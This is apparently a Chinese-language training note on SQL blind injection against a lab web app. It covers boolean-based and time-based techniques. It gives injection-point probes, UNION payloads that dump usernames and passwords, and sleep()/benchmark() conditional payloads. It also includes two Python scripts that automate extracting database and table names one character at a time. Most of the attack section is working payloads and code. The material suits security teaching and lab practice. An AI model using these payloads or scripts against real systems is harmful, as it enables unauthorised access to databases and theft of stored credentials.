[TOC]



# ==SQL注入-盲注==

盲注的使用场景：union不行，报错不行，没有任何回显的时候

## 课程目标

1、理解布尔型盲注的特点和原理

2、理解时间型盲注的特点和原理

3、python实现盲注并完成拖库操作

4、当明确系统存在SQL注入漏洞，但是却没有任何回显，包括错误的回显也没有时，我们可以通过使用 `and 1=1` 和 `and 1=2` 这类条件语句来判断页面是否存在条件不同的内容，如果都没有回显，且条件不同内容不同，则具备盲注条件。

## 一、Boolean型盲注

Boolean是基于真假的判断（true or false）；不管输入什么，结果都只返回真或假两种情况。Boolean型盲注的关键在于通过表达式结果与已知值进行对比，根据对比结果判断正确与否。

**我认为Boolean盲注的情况就是错误的时候什么都不回显，正确的时候会输出正确的信息**

比如说：

正确的情况：

![image-20240712133748659](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240712133748659.png)

错误的情况：

![image-20240712133828340](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240712133828340.png)

盲注有时需要一个一个字符去猜，因此一些字符串的函数经常被用到。

```sql
length();  #返回查询字符串的长度
mid(column_name,start,length);  #截取字符串
substr(string,start,length);  #截取字符串
left(string,n);  #截取字符串
ord();  #返回单个字符的ASCII码
ASCII();  #返回单个字符或字符串最左侧字符的ASCII码
```

举例：

```sql
1 and length(database())=5
1 and substr(database(),1,1)='w'--+
```

使用burp进行遍历，获取正确的数据库名称

### 步骤：

#### 1、查看是否存在注入点

```sql
http://192.168.230.147/security/read.php?articleid=5
#正常输出

http://192.168.230.147/security/read.php?articleid=5'--+
#不输出

http://192.168.230.147/security/read.php?articleid=5 order by 5
#不输出

http://192.168.230.147/security/read.php?articleid=5 order by 3
#正常输出
```

说明有注入点

#### 2、union联合查询注入

```sql
-1 union select 1,2,3
#第一步select的列数与原列数保持一致

-1 union select 1,database(),3
#查询当前数据库名（当然，弱国该函数被屏蔽掉了就无法使用sql注入了）

-5 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema="woniunote"),3
#数据库名知道了就查该数据库中的表

-5 union select 1,(select group_concat(column_name) from information_schema.columns where table_name="users"),3
#利用上面得到的表名，来查没一张表中的列名

http://192.168.230.147/security/read.php?articleid=-5 union select 1,(select group_concat(concat(userid,"==",username,"==",password)) from users),3
#已知表名和表中的列名，直接查数据
```

> 当然如果union查询什么都查不到，一直报错，那就再换报错注入

#### 3、报错注入

既然错误的信息全都不回显，那么报错注入毋庸置疑是用不了的

#### 4、Boolean盲注

```sql
http://192.168.230.147/security/read.php?articleid=5 and length(database())=9
#先判断数据库名称长度

http://192.168.230.147/security/read.php?articleid=5 and substr(database(),1,1)="w"
#在遍历查看数据库名称中的每一个字符，这个操作完全可以用python和burp进行提高效率

http://192.168.230.147/security/read.php?articleid=5 and (select mid(database(),1,1)="w")
#这样还可以构造更复杂的SQL语句
```

![image-20240712151416352](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240712151416352.png)

![image-20240712151427973](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240712151427973.png)

![image-20240712151448923](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240712151448923.png)

大小写无所谓的原因是，数据库创建时选择的字符集编码有 ci ，意思就是 case insensitive 不敏感

**python实现布尔盲注**

```python
def Boolean_Blind_Injection_Get_Database_Name():
    # num_dict的长度和url和cookie的值都需要修改，对应本次注入的值
    DB_name = ''
    num_dict = ['1','2','3','4','5','6','7','8','9']  # 需要修改长度
    char_dict = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
          '0','1','2','3','4','5','6','7','8','9','_']
    header={"Cookie":"vcode=8098; PHPSESSID=94d28a5e45f52cd050544a4dd89b6d8c"}   # 需要修改
    for num in num_dict:
        for c in char_dict:
            url=f'http://192.168.230.147/security/read.php?articleid=5 and substr(database(),{num},1)="{c}"'  # 需要修改
            resp = requests.get(url=url,headers=header)
            # print(resp.text)
            # print(type(resp.text))
            time.sleep(0.5)
            if 'SimKai' in resp.text:
                DB_name += c
            #     print(resp.text)
                print(DB_name)

#获取数据库名称之后,通过对所有表名称长度加起来进行便利得到名称长度之后，然后再逐个去遍历，最总得到所有表的名字
def Boolean_Blind_Injection_Get_Table_Name():
    # num_dict = ['1','2','3','4','5','6','7','8','9']
    char_dict = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
          '0','1','2','3','4','5','6','7','8','9','_',',']
    DB_Name = 'woniunote' # 需要修改
    table_name_length = ''
    table_name = ''
    header={"Cookie":"vcode=8098; PHPSESSID=94d28a5e45f52cd050544a4dd89b6d8c"}   # 需要修改
    for num1 in range(1,4):
        for num2 in range(1,10):
            url1=f'http://192.168.230.147/security/read.php?articleid=5 and substr((select length(group_concat(table_name)) from information_schema.tables where table_schema="{DB_Name}"),{num1},1)="{num2}"'   # 需要修改
            resp = requests.get(url=url1,headers=header)
            time.sleep(0.3)
            if 'SimKai' in resp.text:
                table_name_length += str(num2)
    print(f'table_name_length={table_name_length}')
    for num3 in range(1,int(table_name_length)+1):
        for c in char_dict:
            url2 = f'http://192.168.230.147/security/read.php?articleid=5 and substr((select group_concat(table_name) from information_schema.tables where table_schema="{DB_Name}"),{num3},1)="{c}"'
            resp = requests.get(url=url2,headers=header)
            time.sleep(0.3)
            if 'SimKai' in resp.text:
                table_name += c
        print(table_name)
```





## 二、时间型盲注

Boolean盲注还是能通过页面返回的是否有东西来判断注入正确与否，但如果页面连任何信息都不回显的时候怎么办，不管正确的信息还是错误的信息，系统都不再回显，这时就需要时间型盲注了，时间型盲注就是在布尔盲注的基础上，首先经过真假的判断，然后再真假判断上添加事时间判断。

时间盲注所需函数大多与布尔盲注相同

```sql
length();  #返回查询字符串的长度
mid(column_name,start,length);  #截取字符串
substr(string,start,length);  #截取字符串
left(string,n);  #截取字符串
ord();  #返回单个字符的ASCII码
ASCII();  #返回单个字符或字符串最左侧字符的ASCII码
if();  #逻辑判断
sleep();  #控制时间，通过时间判断
benchmark();  #控制时间，同上
```

举例：

这个时候什么情况下都看不到搜索的内容了

```
http://192.168.230.147/security/read.php?articleid=5
http://192.168.230.147/security/read.php?articleid=5 and 1=2
。。。

```

这个时候就要用到时间盲注

```sql
http://192.168.230.147/security/read.php?articleid=5 and if(length(database())<10,sleep(5),1)
#此时如果数据库名称长度小于10，那么就休眠5秒，否则什么都不干


```

举例：

```sql
1 and if(length(database())=5,sleep(5),1)
1 and if(substr(database(),1,1)="w",sleep(5),1)
1 and (select BENCMARK(50000000,(select username from user limit 1)))
```

**python实现时间盲注**

```python
def Time_Blind_Injection():
    char_dict = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
          '0','1','2','3','4','5','6','7','8','9','_',',']
    DB_Length = 0
    DB_Name= ''
    table_name_length = ''
    table_name = ''
    header = {"Cookie": "vcode=8098; PHPSESSID=94d28a5e45f52cd050544a4dd89b6d8c"}
    #获取数据库名称长度
    for num in range(30):
        start = time.time()
        url = f"http://192.168.230.147/security/read.php?articleid=5 and if(length(database())={num},sleep(5),1)"
        resp = requests.get(url=url,headers=header)
        end = time.time()
        time.sleep(0.5)
        # print(int(end-start))
        if int(end-start) >= 5:
            print(f"lenght(database())={num}")
            DB_Length = num
            break

    #获取数据库名称
    for num in range(1,DB_Length+1):
        for c in char_dict:
            start = time.time()
            url2 = f'http://192.168.230.147/security/read.php?articleid=5 and if(substr((select database()),{num},1)="{c}",sleep(5),1)'
            resp = requests.get(url=url2, headers=header)
            end = time.time()
            time.sleep(0.5)
            if int(end - start) >= 5:
                DB_Name += c
        print(DB_Name)

    #获取表名长度总和
    for num1 in range(1,4):
        for num2 in range(1,10):
            start = time.time()
            url1=f'http://192.168.230.147/security/read.php?articleid=5 and if(substr((select length(group_concat(table_name)) from information_schema.tables where table_schema="{DB_Name}"),{num1},1)="{num2}",sleep(5),1)'   # 需要修改
            resp = requests.get(url=url1,headers=header)
            end = time.time()
            time.sleep(0.3)
            if int(end - start) >= 5:
                table_name_length += str(num2)
    print(f'table_name_length={table_name_length}')
    #获取表名
    for num3 in range(1,int(table_name_length)+1):
        for c in char_dict:
            start = time.time()
            url2 = f'http://192.168.230.147/security/read.php?articleid=5 and if(substr((select group_concat(table_name) from information_schema.tables where table_schema="{DB_Name}"),{num3},1)="{c}",sleep(5),1)'
            resp = requests.get(url=url2,headers=header)
            end = time.time()
            time.sleep(0.3)
            if int(end - start) >= 5:
                table_name += c
        print(table_name)
```

> 继续持续对python代码进行优化







































![image-20240712113959485](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240712113959485.png)
